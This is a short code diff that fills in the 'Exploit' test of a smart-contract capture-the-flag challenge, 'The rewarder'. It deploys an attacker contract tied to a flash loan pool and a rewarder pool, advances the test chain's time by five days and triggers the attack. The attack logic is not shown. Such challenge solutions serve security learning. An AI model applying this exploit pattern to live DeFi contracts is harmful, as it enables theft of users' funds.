@@ -66,6 +66,10 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const AttackerFactory = await ethers.getContractFactory('Attacker', attacker);
+        const attackContract = await AttackerFactory.deploy(this.flashLoanPool.address, this.rewarderPool.address, this.rewardToken.address, this.liquidityToken.address, attacker.address);
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
+        await attackContract.attack();
     });
 
     after(async function () {
